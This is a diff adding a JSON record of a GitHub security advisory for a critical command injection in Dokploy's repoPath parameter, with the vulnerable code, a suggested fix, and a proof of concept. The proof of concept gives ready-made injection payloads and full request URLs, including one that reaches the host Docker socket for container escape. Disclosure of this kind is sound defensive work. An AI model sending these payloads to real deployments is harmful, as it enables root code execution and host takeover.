@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-56g6-wjr4-5q7p",
+  "repo": {
+    "cve_id": "CVE-2026-93425",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nThe `patch.readRepoDirectories` tRPC procedure passes the user-controlled `repoPath` parameter directly into a shell command without any sanitization. An authenticated low-privilege organization member (not admin/owner) can inject arbitrary OS commands that execute as root inside the Dokploy container. Because the container mounts the host Docker socket (`/var/run/docker.sock`), this escalates to full host compromise.\r\n\r\n### Details\r\n\r\nVulnerable sink: `packages/server/src/services/patch-repo.ts`:\r\n\r\n```ts\r\nexport const readPatchRepoDirectory = async (repoPath: string, serverId?: string | null) => {\r\n  // user-controlled repoPath interpolated directly into a shell string\r\n  const command = `cd \"${repoPath}\" && git ls-tree -r --name-only HEAD`;\r\n  ...\r\n  const result = await execAsync(command); // child_process.exec -> /bin/sh -c\r\n  ...\r\n};\r\n```\r\n\r\nEntry point:  `apps/dokploy/server/api/routers/patch.ts`:\r\n\r\n```ts\r\nreadRepoDirectories: protectedProcedure\r\n  .input(z.object({\r\n    id: z.string().min(1),\r\n    type: z.enum([\"application\", \"compose\"]),\r\n    repoPath: z.string(),          // <-- no validation / sanitization\r\n  }))\r\n  .query(async ({ input, ctx }) => {\r\n    await checkServicePermissionAndAccess(ctx, input.id, { service: [\"read\"] });\r\n    ...\r\n    return await readPatchRepoDirectory(input.repoPath, serverId);\r\n  }),\r\n```\r\n\r\n`repoPath` is a bare `z.string()` and is never validated. `execAsync` is a thin wrapper over Node's `child_process.exec`, which runs the string through `/bin/sh -c`, so any shell metacharacter in `repoPath` is interpreted.\r\n\r\nThe only authorization gate is `checkServicePermissionAndAccess(..., { service: [\"read\"] })`. The default `memberRole` already grants `service: [\"read\"]` (see `packages/server/src/lib/access-control.ts`), so any member who has access to at least one service can reach this sink. Note that `input.id` is used only to resolve `serverId`; it has no relation to `repoPath`.\r\n\r\nThe sibling procedure `patch.readRepoFile` (~line 171, `cat \"${fullPath}\"` where `fullPath` is built from a user-controlled `filePath` via `path.join`) is reachable with the same privilege level and is vulnerable to path traversal and command injection as well.\r\n\r\n### PoC\r\n\r\nTested against a clean v0.29.8 Docker deployment, using a low-privilege member account (org role = `member`, permissions limited to `service:read` plus access to a single application; `member.*`, `organization.*`, `project.create` all `false`).\r\n\r\n<img width=\"869\" height=\"774\" alt=\"image\" src=\"https://github.com/user-attachments/assets/82836365-2da5-4419-8d5e-6d1e0e42c333\" />\r\n\r\n1. Authenticate as the member (better-auth requires an `Origin` header):\r\n\r\n<img width=\"1917\" height=\"980\" alt=\"image\" src=\"https://github.com/user-attachments/assets/207ab88a-3f47-43c4-9ce7-1dcacb64f5af\" />\r\n\r\n2. Discover an `applicationId` the member can access:\r\n\r\n<img width=\"1571\" height=\"722\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a4d92ff9-fa4e-4b0b-8ca8-95a30a54849f\" />\r\n\r\napplicationId is OjwLF2dQrqG6CNJ9noVEf\r\n\r\n3. Trigger the injection. The `repoPath` payload closes the `cd \"...\"` quote, runs arbitrary commands (stdout redirected to stderr so the output is returned in the tRPC error message), then reopens the quote:\r\n\r\n```\r\nURL_ENCODE<{\"0\":{\"json\":{\"id\":\"<applicationId>\",\"type\":\"application\",\"repoPath\":\"\\\"; { id ; } >&2; echo \\\"\"}}}>\r\n```\r\n\r\nRequest:\r\nGET /api/trpc/patch.readRepoDirectories?batch=1&input={\"0\"%3a{\"json\"%3a{\"id\"%3a\"OjwLF2dQrqG6CNJ9noVEf\",\"type\"%3a\"application\",\"repoPath\"%3a\"\\\"%3b+{+id+%3b+}+>%262%3b+echo+\\\"\"}}}\r\n\r\n<img width=\"1572\" height=\"619\" alt=\"image\" src=\"https://github.com/user-attachments/assets/82a781f5-e1fc-4eeb-962d-9b82750091f4\" />\r\n\r\n**Container escape via the mounted Docker socket:**\r\n\r\n```\r\nURL_ENCODE<{\"0\":{\"json\":{\"id\":\"OjwLF2dQrqG6CNJ9noVEf\",\"type\":\"application\",\"repoPath\":\"\\\"; { curl -s --unix-socket /var/run/docker.sock http://localhost/version ; } >&2; echo \\\"\"}}}>\r\n```\r\n\r\nRequest:\r\nGET /api/trpc/patch.readRepoDirectories?batch=1&input={\"0\"%3a{\"json\"%3a{\"id\"%3a\"OjwLF2dQrqG6CNJ9noVEf\",\"type\"%3a\"application\",\"repoPath\"%3a\"\\\"%3b+{+curl+-s+--unix-socket+/var/run/docker.sock+http%3a//localhost/version+%3b+}+>%262%3b+echo+\\\"\"}}}\r\n\r\n<img width=\"1565\" height=\"720\" alt=\"image\" src=\"https://github.com/user-attachments/assets/80b6da87-5f35-49fd-b17e-952044a361e4\" />\r\n\r\nFrom here an attacker can create a privileged container that bind-mounts the host filesystem (`/:/host`) via the Docker socket, achieving full host takeover.\r\n\r\n### Impact\r\n\r\n- Type: OS Command Injection (CWE-78) leading to Remote Code Execution.\r\n- Privilege required: any authenticated organization **member** with read access to a single service - no admin/owner role needed.\r\n- Execution context: commands run as `uid=0(root)` inside the Dokploy container.\r\n- Escalation: the host Docker socket is reachable, enabling container escape and full compromise of the Dokploy host and every application/database it manages.\r\n\r\n### Suggested fix\r\n\r\n- Do not interpolate user input into a shell string. Invoke git with an argument array, e.g. `execFile(\"git\", [\"-C\", resolvedPath, \"ls-tree\", \"-r\", \"--name-only\", \"HEAD\"])`.\r\n- Resolve and confine the path before use:\r\n  ```ts\r\n  const resolved = path.resolve(repoBase, repoPath);\r\n  if (resolved !== repoBase && !resolved.startsWith(repoBase + path.sep)) {\r\n    throw new Error(\"Invalid path\");\r\n  }\r\n  ```\r\n- Apply a strict allowlist to `repoPath` / `filePath` (reject `..` and shell metacharacters). Apply the same fix to `patch.readRepoFile`.",
+    "ghsa_id": "GHSA-56g6-wjr4-5q7p",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-56g6-wjr4-5q7p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-56g6-wjr4-5q7p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-93425"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:00Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated OS Command Injection in patch.readRepoDirectories (repoPath) leads to RCE as root",
+    "updated_at": "2026-09-21T19:21:33Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "docker / self-hosted (dokploy/dokploy)",
+          "name": "dokploy/dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
